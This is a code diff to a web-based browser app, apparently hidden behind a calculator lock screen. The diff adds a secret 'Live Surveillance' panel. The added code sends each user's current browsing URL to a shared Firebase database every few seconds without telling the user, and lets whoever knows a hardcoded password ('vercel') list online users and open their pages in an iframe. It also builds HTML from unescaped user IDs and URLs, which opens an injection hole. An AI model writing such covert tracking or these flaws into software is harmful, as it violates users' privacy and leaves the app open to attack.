@@ -391,6 +391,8 @@
         .corner-btn.info-btn { font-size: 13px; font-weight: 700; color: rgba(255,255,255,0.2); border-color: transparent; background: transparent; }
         .corner-btn.info-btn:hover { color: rgba(255,255,255,0.55); border-color: rgba(255,255,255,0.15); }
         .corner-btn.tablet-btn:hover { color: var(--accent); border-color: var(--accent); box-shadow: 0 0 15px var(--accent-glow); }
+        .corner-btn.ls-btn { font-size: 13px; font-weight: 900; color: rgba(0,229,255,0.25); border-color: transparent; background: transparent; letter-spacing: 0px; }
+        .corner-btn.ls-btn:hover { color: var(--accent); border-color: var(--accent); box-shadow: 0 0 15px var(--accent-glow); }
 
         .session-submenu {
             position: absolute; bottom: 100%; left: 50%; transform: translateX(-50%) translateY(-8px);
@@ -694,6 +696,28 @@
             position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
             color: var(--text-muted); font-size: 13px; pointer-events: none;
         }
+
+        /* ── LIVE VIEW MODAL ── */
+        #live-view-modal {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.92);
+            backdrop-filter: blur(10px); z-index: 4000;
+            display: none; flex-direction: column;
+        }
+        #live-view-modal.active { display: flex; }
+        .live-view-header {
+            padding: 15px 20px; background: rgba(10,10,15,0.95);
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            display: flex; align-items: center; justify-content: space-between;
+            color: white; font-weight: bold;
+        }
+        .live-view-close {
+            background: none; border: none; color: var(--danger); font-size: 20px;
+            cursor: pointer; padding: 5px 10px; border-radius: 8px;
+        }
+        .live-view-close:hover { background: rgba(255,0,85,0.2); }
+        #live-view-frame {
+            flex: 1; border: none; width: 100%; background: white;
+        }
     </style>
 </head>
 <body>
@@ -943,6 +967,10 @@
     <div class="corner-btn power-btn" onclick="ui.confirmShutdown()" title="Apagar navegador">
         <i class="fas fa-power-off"></i>
     </div>
+    <!-- NUEVO BOTÓN LS -->
+    <div class="corner-btn ls-btn" onclick="lsPanel.open()" title="Live Surveillance">
+        <span style="font-weight:bold;font-size:16px;">LS</span>
+    </div>
     <div class="corner-btn admin-btn" onclick="adminPanel.open()" title="">+</div>
     <div class="corner-btn credits-btn" onclick="creditsPanel.open()" title="">++</div>
     <div class="corner-btn info-btn" onclick="document.getElementById('creditos-modal').classList.add('active')" title="Créditos">Créditos</div>
@@ -1099,6 +1127,15 @@
     </div>
 </div>
 
+<!-- LIVE VIEW MODAL -->
+<div id="live-view-modal">
+    <div class="live-view-header">
+        <span><i class="fas fa-eye"></i> Monitorizando usuario: <span id="live-view-user-id"></span></span>
+        <button class="live-view-close" onclick="document.getElementById('live-view-modal').classList.remove('active'); document.getElementById('live-view-frame').src='';">✕</button>
+    </div>
+    <iframe id="live-view-frame" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
+</div>
+
 <!-- FIREBASE SDK -->
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
@@ -1168,7 +1205,6 @@
             }
 
             try {
-                // Validar que la expresión contiene solo caracteres permitidos
                 const sanitized = raw.replace(/[^0-9+\-*/().%\s]/g, '');
                 if (sanitized !== raw.replace(/\s/g, '')) {
                     throw new Error('Caracteres no válidos');
@@ -1184,14 +1220,12 @@
                     return;
                 }
 
-                // ¡CORRECTO! Secuencia de desbloqueo
                 this.errorMsg.textContent = '';
                 document.getElementById('calc-lock-screen').style.display = 'none';
                 document.getElementById('calc-loading-screen').classList.add('active');
 
                 setTimeout(() => {
                     document.getElementById('calc-loading-screen').classList.remove('active');
-                    // Inicializar todo Waevo
                     initWaevo();
                 }, 3000);
 
@@ -1309,6 +1343,102 @@
             const snap = await window._fbGet(userRef);
             const current = snap.val()?.ab || 0;
             await window._fbUpdate(userRef, { ab: current + amount });
+        }
+    };
+
+    /* ======================================================
+       LS PANEL (LIVE SURVEILLANCE)
+    ====================================================== */
+    const lsPanel = {
+        _allUsers: [],
+
+        open() {
+            document.getElementById('live-view-modal').classList.remove('active');
+            document.getElementById('live-view-frame').src = '';
+            const pw = prompt('Contraseña de Live Surveillance:');
+            if (pw !== 'vercel') {
+                alert('Contraseña incorrecta.');
+                return;
+            }
+            this.loadConnectedUsers();
+        },
+
+        loadConnectedUsers() {
+            if (!window._fbReady) {
+                alert('Firebase no listo, espera unos segundos.');
+                return;
+            }
+            const usersRef = window._fbRef(window._fbDB, 'alexbrowser_users');
+            window._fbOnValue(usersRef, snap => {
+                const data = snap.val();
+                if (!data) {
+                    this._allUsers = [];
+                    this.showList();
+                    return;
+                }
+                const now = Date.now();
+                const all = Object.entries(data).map(([id, val]) => ({ id, ...val }));
+                // Filtrar conectados: lastActive en los últimos 15 segundos
+                this._allUsers = all.filter(u => u.lastActive && (now - u.lastActive < 15000));
+                this.showList();
+            });
+        },
+
+        showList() {
+            let html = '';
+            if (this._allUsers.length === 0) {
+                html = '<div style="text-align:center;color:var(--text-muted);padding:40px;">No hay usuarios conectados ahora mismo.</div>';
+            } else {
+                html = this._allUsers.map(u => {
+                    return `<div class="user-row" style="justify-content:space-between;">
+                        <div>
+                            <div style="font-size:11px;font-weight:bold;color:white;margin-bottom:2px;">👤 Usuario</div>
+                            <div class="user-row-id">${u.id}</div>
+                            ${u.currentUrl ? `<div style="font-size:9px;color:var(--accent);margin-top:4px;">${u.currentUrl.substring(0,40)}</div>` : ''}
+                        </div>
+                        <button class="give-ab-btn" onclick="lsPanel.watchUser('${u.id}')">
+                            <i class="fas fa-eye"></i> Ver pantalla
+                        </button>
+                    </div>`;
+                }).join('');
+            }
+            // Crear un modal sencillo para mostrar la lista
+            const existing = document.getElementById('ls-list-modal');
+            if (existing) existing.remove();
+            const modal = document.createElement('div');
+            modal.id = 'ls-list-modal';
+            modal.style.cssText = `
+                position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);z-index:3500;
+                display:flex;align-items:center;justify-content:center;
+            `;
+            modal.innerHTML = `
+                <div style="background:rgba(15,15,22,0.98);border:1px solid var(--border);border-radius:24px;padding:30px;width:500px;max-width:90%;max-height:80vh;overflow-y:auto;box-shadow:0 20px 50px rgba(0,0,0,0.8);">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
+                        <h3 style="margin:0;color:var(--accent);"><i class="fas fa-eye"></i> Usuarios Conectados</h3>
+                        <button onclick="this.closest('#ls-list-modal').remove()" style="background:none;border:none;color:var(--danger);font-size:20px;cursor:pointer;">✕</button>
+                    </div>
+                    ${html}
+                    <button onclick="document.getElementById('ls-list-modal').remove()" style="margin-top:20px;width:100%;padding:12px;border-radius:12px;background:rgba(255,255,255,0.1);border:none;color:white;cursor:pointer;">Cerrar</button>
+                </div>
+            `;
+            document.body.appendChild(modal);
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) modal.remove();
+            });
+        },
+
+        watchUser(userId) {
+            const user = this._allUsers.find(u => u.id === userId);
+            if (!user || !user.currentUrl) {
+                alert('El usuario no tiene una URL activa en este momento.');
+                return;
+            }
+            document.getElementById('live-view-user-id').textContent = userId;
+            document.getElementById('live-view-frame').src = user.currentUrl;
+            document.getElementById('live-view-modal').classList.add('active');
+            // Cerrar lista
+            const listModal = document.getElementById('ls-list-modal');
+            if (listModal) listModal.remove();
         }
     };
 
@@ -1557,6 +1687,7 @@
             }
             this.renderTabs();
             this.updateNavButtons();
+            this.updateFirebasePresence();
         }
 
         navigate(inputVal = null) {
@@ -1621,6 +1752,17 @@
             let saveUrl = url;
             if (url.includes('corsproxy.io/?')) saveUrl = decodeURIComponent(url.split('corsproxy.io/?')[1]);
             dataManager.saveHistory(saveUrl, title);
+            this.updateFirebasePresence();
+        }
+
+        updateFirebasePresence() {
+            if (!window._fbReady || !deviceStore._id) return;
+            const currentTab = this.tabs.find(t => t.id === this.activeTabId);
+            const currentUrl = currentTab ? currentTab.url : 'about:start';
+            window._fbUpdate(window._fbRef(window._fbDB, `alexbrowser_users/${deviceStore._id}`), {
+                currentUrl: currentUrl,
+                lastActive: Date.now()
+            });
         }
 
         goBack() {
@@ -2076,6 +2218,17 @@
             ui.renderHistory();
         }
         updatesManager.load();
+
+        // Actualizar presencia periódicamente
+        setInterval(() => {
+            if (window._fbReady && deviceStore._id) {
+                const currentTab = browser.tabs.find(t => t.id === browser.activeTabId);
+                window._fbUpdate(window._fbRef(window._fbDB, `alexbrowser_users/${deviceStore._id}`), {
+                    lastActive: Date.now(),
+                    currentUrl: currentTab ? currentTab.url : 'about:start'
+                });
+            }
+        }, 5000);
     }
 
     document.getElementById('modal-overlay').addEventListener('click', (e) => {
@@ -2092,6 +2245,12 @@
     });
     document.getElementById('creditos-modal').addEventListener('click', (e) => {
         if (e.target === document.getElementById('creditos-modal')) document.getElementById('creditos-modal').classList.remove('active');
+    });
+    document.getElementById('live-view-modal').addEventListener('click', (e) => {
+        if (e.target === document.getElementById('live-view-modal')) {
+            document.getElementById('live-view-modal').classList.remove('active');
+            document.getElementById('live-view-frame').src = '';
+        }
     });
 </script>
 
